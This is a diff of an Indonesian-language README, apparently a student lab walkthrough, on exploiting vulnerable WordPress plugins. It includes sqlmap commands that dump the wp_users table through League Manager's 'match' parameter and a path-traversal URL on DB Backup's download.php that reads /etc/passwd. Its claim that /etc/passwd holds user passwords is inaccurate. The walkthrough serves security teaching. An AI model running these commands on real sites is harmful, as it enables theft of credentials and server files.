@@ -134,8 +134,7 @@ wpscan --url http://[url yang dituju] -enumerate
 Maka akan muncul tanda yang menunjukan celah keamanan dari plugin yang sudah di install pada wordpress
 ![GitHub Logo](PKSJ2/wpscan.JPG)
 
-###Exploit dan Inject Sql menggunakan Sqlmap
-####Inject Melalui League Manager
+###Exploit dan Inject Sql menggunakan Sqlmap pada plugin league manager
 1. Silahkan jalankan perintah dibawah ini untuk mengetahui bagaimana struktur tabel dari wordpress yang ada
 ```
 sqlmap --url "http://[alamat yang dituju]/?match=1" --tables
@@ -148,4 +147,21 @@ sqlmap --url "http://[alamat yang dituju]/?match=1" --dump -D [database yang dii
 ```
 ![GitHub Logo](PKSJ2/sqlmaplm2.JPG)
 
-3. Ketika sudah mendapatkan data nya 
+3. Pada case ini, kita akan mencoba membuka dan melihat tabel wp_users, makan masukkan perintah
+```
+sqlmap --url "http://10.151.36.128/?match=1" --dump -D wordpress -T wp_users
+```
+![GitHub Logo](PKSJ2/sqlmaplm3.JPG)
+Bisa dilihat bahwa kita mendapatkan isi dari tabel wp_user, akan tetapi pada bagian password, hanya terlihat hasil enkripsinya karena di hash dictionary dari aplikasi sqlmap, tidak ada yang cocok dengan password user tersebut
+
+###Mencari Celah Keamanan pada plugin DB Backup
+1. Silahkan install plugin db Backup, dan silahkan masukkan url berikut pada browser anda untuk membuktikan celah keamanan db backup
+```
+[localhost]/wp-content/plugins/db-backup/download.php?file=/etc/passwd
+```
+2. Maka bisa dilihat bahwa kita bisa mendownload isi dari /etc/passwd dan mendapatkan password dari user yang ada pada server tersebut
+![GitHub Logo](PKSJ2/jebol1.JPG)
+Mendownload file passwd.passwd
+![GitHub Logo](PKSJ2/jebol2.JPG)
+Isi dari file passwd.passwd
+
